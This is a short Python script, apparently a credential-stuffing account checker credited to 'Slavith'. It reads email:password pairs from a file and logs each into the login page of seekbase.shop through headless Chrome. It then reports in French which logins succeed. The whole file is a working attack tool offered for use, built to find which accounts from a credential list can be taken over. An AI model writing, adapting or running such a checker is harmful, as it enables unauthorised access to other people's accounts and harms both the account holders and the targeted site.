from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from colorama import Fore
import colorama
import sys
import logging

colorama.init(autoreset=True)
logging.getLogger("selenium").setLevel(logging.CRITICAL) 


options = Options()
options.add_argument("--headless")  
options.add_argument("--disable-extensions") 
options.add_argument("--disable-gpu")  
options.add_argument("--no-sandbox")  
options.add_argument("--disable-dev-shm-usage")  
options.add_argument("--log-level=3")  
options.add_argument("--remote-debugging-port=0")  
options.add_argument("--disable-software-rasterizer") 
options.add_argument("--disable-webgl") 
options.add_argument("--disable-logging")  
options.add_argument("--silent")  
sys.stdout = sys.__stdout__  
sys.stderr = sys.__stderr__  


service = Service(ChromeDriverManager().install())
driver = webdriver.Chrome(service=service, options=options)

def test_login(email, password):
    try:
        driver.get("https://seekbase.shop/login")
        driver.find_element(By.NAME, "email").send_keys(f"{email}")
        driver.find_element(By.NAME, "password").send_keys(f"{password}")

        login_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CLASS_NAME, "auth__submit-btn"))
        )
        login_button.click()

        WebDriverWait(driver, 2).until(
            EC.url_contains("/dashboard/graph")
        )

        welcome_text = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, "//*[contains(text(), 'Welcome back!')]"))
        )

        if welcome_text:
            print(f"{Fore.CYAN}[{Fore.WHITE}!{Fore.CYAN}] Connexion réussie pour {Fore.GREEN}{email} !")
        else:
            print(f"{Fore.CYAN}[{Fore.WHITE}x{Fore.CYAN}] Échec de la connexion pour {Fore.GREEN}{email}")
    except Exception as e:
        print(f"{Fore.CYAN}[{Fore.WHITE}ERROR{Fore.CYAN}] Échec de la connexion pour {Fore.GREEN}{email}")

def test_accounts_from_file(file_path):
    with open(file_path, "r") as file:
        accounts = file.readlines()
    
    for account in accounts:
        email, password = account.strip().split(":")  
        test_login(email, password)

    driver.quit()

print(rf"""{Fore.CYAN}

                                           
                                           
                                      ,-.  
                                  ,--/ /|  
                                ,--. :/ |  
  .--.--.                       :  : ' /   
 /  /    '     ,---.     ,---.  |  '  /    
|  :  /`./    /     \   /     \ '  |  :    
|  :  ;_     /    /  | /    /  ||  |   \   
 \  \    `. .    ' / |.    ' / |'  : |. \  
  `----.   \'   ;   /|'   ;   /||  | ' \ \ 
 /  /`--'  /'   |  / |'   |  / |'  : |--'  
'--'.     / |   :    ||   :    |;  |,'     
  `--'---'   \   \  /  \   \  / '--'     Coded by Slavith
              `----'    `----'             
                                           

""")
test_accounts_from_file("accounts.txt")
